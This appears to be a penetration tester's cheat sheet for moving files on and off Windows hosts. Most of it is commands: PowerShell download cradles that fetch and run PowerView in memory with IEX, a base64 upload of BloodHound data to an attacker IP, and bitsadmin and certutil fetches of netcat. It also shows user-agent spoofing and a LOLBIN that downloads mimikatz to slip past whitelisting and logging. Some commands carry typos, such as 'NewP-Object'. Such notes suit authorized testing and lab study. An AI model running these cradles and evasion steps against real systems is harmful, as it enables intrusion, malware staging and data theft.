# Windows File Transfer Methods

## PowerShell 

### Download

```PowerShell
# Download over HTTP

(New-Object System.Net.WebClient).DownloadFile('https://<snip>/PowerView.ps1',"C:\<snip>\PowerView.ps1")

# From PowerShell 3.0 Invoke-WebRequest is available with aliases iwr, curl and wget

iwr https://<snip>PowerView.ps1 -OutFile PowerView.ps1

# Executation Cradle to load into memory

IEX (NewP-Object Net.WebClient).downloadstring('https://<snip>/PowerView.ps1')

# Executation Crade via Pipeline input

iwr https://<snip>PowerView.ps1 -OutFile PowerView.ps1 | iex

# If Using IWR and you get IE First-Launch Configuration this can be bypassed using `-UseBasicParsing`

iwr https://<snip>PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing
iwr https://<snip>PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing | iex
```

Additional PowerShell download cradles can be found at [PowerShell Download Cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

### Upload

It is also possible to upload files using PowerShell with either `Invoke-WebRequest` or `Invoke-RestMethod`

```PowerShell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))

Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```

After catching the content with NetCat, or other preferred transfer method, you can decode it on your Kali machine using:

```Bash
echo <base64> | base64 -d -w 0 > bloodhound.zip
```

## BitsAdmin

### Download

```PowerShell
# Bitsadmin Executable

bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe

# BitsAdmin PowerShell Module

Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```

### Upload

```PowerShell
Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql

```

## CertUtil

This tool is in every version of Windows and is a popular technique; however, the AntiMalware Scan Interface (AMSI) can detect this as malicious certutil usage

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

# Avoiding Detection

In the event that there is filtering on User Agents, it is possible to use `Invoke-WebRequests` to change the default user agent to one emulating IE, FireFox, Chrome, Opera or Safare

```PowerShell
# List the User Agents available
PS C:\> [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16

# Setting the User Agent to Chrome
PS C:\> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"

```

If Application whitelisting prevents the use of PowerShell or Netcat and command line logging may alert defeners, there is the option to use a [LOLBIN](https://lolbas-project.github.io/#) (aka misplaced trust binaries). An example is 

```PowerShell
PS C:\> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"

```